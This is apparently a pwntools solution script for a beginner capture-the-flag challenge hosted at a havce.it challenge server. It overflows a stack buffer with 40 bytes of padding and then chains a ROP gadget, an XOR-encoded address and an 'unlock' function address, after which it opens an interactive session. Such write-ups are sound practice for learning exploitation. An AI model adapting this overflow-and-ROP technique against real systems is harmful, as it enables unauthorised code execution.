#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

host = args.HOST or 'rop.chals.beginner.havce.it'
port = int(args.PORT or 1338)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --


gadget = p64(0x00000000004011ff)
unlock = p64(0x000000000040119a)
# 40 = buff + rbp (48 + rip)


io = start()

payload = b'U' * 40 + gadget + p64(0x404028 ^ 0x41) + unlock
io.recvuntil(b': ')
io.sendline(payload)

io.interactive()